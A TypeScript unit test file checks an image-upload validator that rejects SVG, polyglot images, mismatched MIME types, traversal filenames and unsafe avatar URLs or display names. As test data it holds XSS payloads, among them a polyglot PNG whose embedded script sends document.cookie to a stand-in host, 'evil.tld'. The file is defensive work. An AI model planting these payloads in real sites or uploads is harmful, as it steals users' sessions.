import { describe, expect, it } from "vitest";
import {
  containsPolyglotPayload,
  detectImageMagicBytes,
  sanitizeAvatarUrl,
  validateAndSanitizeImageUpload,
  validateDisplayName,
  validateImageFilename,
} from "./safeImageUpload";

function makeFile(bytes: Uint8Array, name: string, type: string): File {
  const buffer = bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength) as ArrayBuffer;
  return new File([buffer], name, { type });
}

const VALID_PNG_BYTES = new Uint8Array([
  0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
  0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
]);

const VALID_JPEG_BYTES = new Uint8Array([
  0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46,
  0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
]);

const VALID_GIF_BYTES = new Uint8Array([
  0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00,
  0x01, 0x00, 0x80, 0x00, 0x00, 0xff, 0xff, 0xff,
]);

const VALID_WEBP_BYTES = new Uint8Array([
  0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00,
  0x57, 0x45, 0x42, 0x50, 0x56, 0x50, 0x38, 0x20,
]);

describe("safeImageUpload security validator", () => {
  it("accepts valid PNG, JPEG, GIF, and WebP magic bytes and returns canonical extensions", async () => {
    const pngRes = await validateAndSanitizeImageUpload(
      makeFile(VALID_PNG_BYTES, "profile.PNG", "image/png"),
    );
    expect(pngRes.valid).toBe(true);
    if (pngRes.valid) {
      expect(pngRes.ext).toBe("png");
      expect(pngRes.mimeType).toBe("image/png");
    }

    const jpgRes = await validateAndSanitizeImageUpload(
      makeFile(VALID_JPEG_BYTES, "photo.jpeg", "image/jpeg"),
    );
    expect(jpgRes.valid).toBe(true);
    if (jpgRes.valid) {
      expect(jpgRes.ext).toBe("jpg");
      expect(jpgRes.mimeType).toBe("image/jpeg");
    }

    const gifRes = await validateAndSanitizeImageUpload(
      makeFile(VALID_GIF_BYTES, "anim.gif", "image/gif"),
    );
    expect(gifRes.valid).toBe(true);
    if (gifRes.valid) {
      expect(gifRes.ext).toBe("gif");
      expect(gifRes.mimeType).toBe("image/gif");
    }

    const webpRes = await validateAndSanitizeImageUpload(
      makeFile(VALID_WEBP_BYTES, "avatar.webp", "image/webp"),
    );
    expect(webpRes.valid).toBe(true);
    if (webpRes.valid) {
      expect(webpRes.ext).toBe("webp");
      expect(webpRes.mimeType).toBe("image/webp");
    }
  });

  it("rejects SVG files and SVG payloads disguised with .png extension and image/png MIME type", async () => {
    const svgPayload = new TextEncoder().encode(
      `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"><circle r="10"/></svg>`,
    );

    const directSvg = await validateAndSanitizeImageUpload(
      makeFile(svgPayload, "avatar.svg", "image/svg+xml"),
    );
    expect(directSvg.valid).toBe(false);

    const disguisedSvg = await validateAndSanitizeImageUpload(
      makeFile(svgPayload, "avatar.png", "image/png"),
    );
    expect(disguisedSvg.valid).toBe(false);
    if (!disguisedSvg.valid) {
      expect(disguisedSvg.error).toMatch(/signature/i);
    }
  });

  it("rejects polyglot images that start with valid magic bytes but embed <script> or PHP payloads", async () => {
    const maliciousTail = new TextEncoder().encode(`<!-- <script>fetch('https://evil.tld/?c='+document.cookie)</script> -->`);
    const polyglotBytes = new Uint8Array(VALID_PNG_BYTES.length + maliciousTail.length);
    polyglotBytes.set(VALID_PNG_BYTES, 0);
    polyglotBytes.set(maliciousTail, VALID_PNG_BYTES.length);

    expect(detectImageMagicBytes(polyglotBytes)?.ext).toBe("png");
    expect(containsPolyglotPayload(polyglotBytes)).toBe(true);

    const res = await validateAndSanitizeImageUpload(
      makeFile(polyglotBytes, "polyglot.png", "image/png"),
    );
    expect(res.valid).toBe(false);
    if (!res.valid) {
      expect(res.error).toMatch(/embedded script or markup/i);
    }
  });

  it("rejects mismatched declared MIME type vs actual binary signature", async () => {
    const mismatch = await validateAndSanitizeImageUpload(
      makeFile(VALID_GIF_BYTES, "trick.png", "image/png"),
    );
    expect(mismatch.valid).toBe(false);
    if (!mismatch.valid) {
      expect(mismatch.error).toMatch(/does not match/i);
    }
  });

  it("rejects double extensions and path traversal filenames", () => {
    expect(validateImageFilename("shell.php.png").valid).toBe(false);
    expect(validateImageFilename("xss.svg.jpg").valid).toBe(false);
    expect(validateImageFilename("payload.html.webp").valid).toBe(false);
    expect(validateImageFilename("../secret/avatar.png").valid).toBe(false);
    expect(validateImageFilename("avatar\0.png").valid).toBe(false);
    expect(validateImageFilename("clean-avatar_2026.png").valid).toBe(true);
  });

  it("rejects empty or oversized files", async () => {
    const emptyFile = makeFile(new Uint8Array(0), "empty.png", "image/png");
    const emptyRes = await validateAndSanitizeImageUpload(emptyFile);
    expect(emptyRes.valid).toBe(false);

    const oversizedBytes = new Uint8Array(1024);
    oversizedBytes.set(VALID_PNG_BYTES, 0);
    const oversizedRes = await validateAndSanitizeImageUpload(
      makeFile(oversizedBytes, "big.png", "image/png"),
      { maxBytes: 512 },
    );
    expect(oversizedRes.valid).toBe(false);
    if (!oversizedRes.valid) {
      expect(oversizedRes.error).toMatch(/too large/i);
    }
  });

  it("sanitizes avatar URLs and blocks javascript:, data:, and insecure protocols", () => {
    expect(sanitizeAvatarUrl("javascript:alert(1)")).toBe("");
    expect(sanitizeAvatarUrl("data:image/svg+xml;utf8,<svg onload=alert(1)>")).toBe("");
    expect(sanitizeAvatarUrl("http://insecure.example.com/avatar.png")).toBe("");
    expect(sanitizeAvatarUrl("https://user:pass@evil.example.com/a.png")).toBe("");
    expect(
      sanitizeAvatarUrl("https://caawgzuofnujrznwbuxk.supabase.co/storage/v1/object/public/avatars/123/avatar.png?t=1"),
    ).toBe("https://caawgzuofnujrznwbuxk.supabase.co/storage/v1/object/public/avatars/123/avatar.png?t=1");
  });

  it("validates display names against HTML tags, script expressions, and excessive length", () => {
    expect(validateDisplayName("Jane Wanjiku")).toEqual({ valid: true, sanitized: "Jane Wanjiku" });
    expect(validateDisplayName("<img src=x onerror=alert(1)>").valid).toBe(false);
    expect(validateDisplayName("javascript:alert(1)").valid).toBe(false);
    expect(validateDisplayName("A".repeat(81)).valid).toBe(false);
  });
});
